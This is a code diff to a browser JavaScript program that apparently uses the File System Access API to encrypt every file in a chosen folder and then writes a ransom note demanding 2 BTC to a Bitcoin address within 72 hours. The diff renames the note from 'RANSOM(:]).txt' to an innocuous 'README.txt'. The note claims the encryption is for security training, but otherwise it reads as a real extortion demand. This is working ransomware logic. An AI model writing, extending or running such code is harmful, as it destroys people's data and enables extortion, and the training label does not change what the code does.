@@ -24,7 +24,7 @@ async function scanFolder(handle, fileList = []) {
 }
 
 async function encryptFile(fileHandle, key) {
-    if (fileHandle.name === "RANSOM(:]).txt") return;
+    if (fileHandle.name === "README.txt") return;
     const file = await fileHandle.getFile();
     const contents = await file.arrayBuffer();
     const iv = window.crypto.getRandomValues(new Uint8Array(12));
@@ -55,7 +55,7 @@ UI.btn.addEventListener('click', async () => {
         }
 
         UI.text.textContent = "DONE. All files encrypted.";
-        const note = await dirHandle.getFileHandle("RANSOM(:]).txt", { create: true });
+        const note = await dirHandle.getFileHandle("README.txt", { create: true });
         const writer = await note.createWritable();
 await writer.write("YOUR FILES HAVE BEEN ENCRYPTED FOR SECURITY TRAINING.\nYOUR FILES HAVE BEEN ENCRYPTED\n\nAll important company data has been locked using strong encryption.\n\nTo recover your files, you must send 2 BTC to the following Bitcoin address:\n\nbc1qf4k3j07hwn4u442jqkkgtasr77cf9wergrz7dq\n\nAfter payment, send proof to the provided contact.\nYou will then receive the decryption key.\n\nWARNING:\n- Do not rename encrypted files\n- Do not attempt decryption\n- Failure to pay within 72 hours will result in permanent data loss");
         await writer.close();
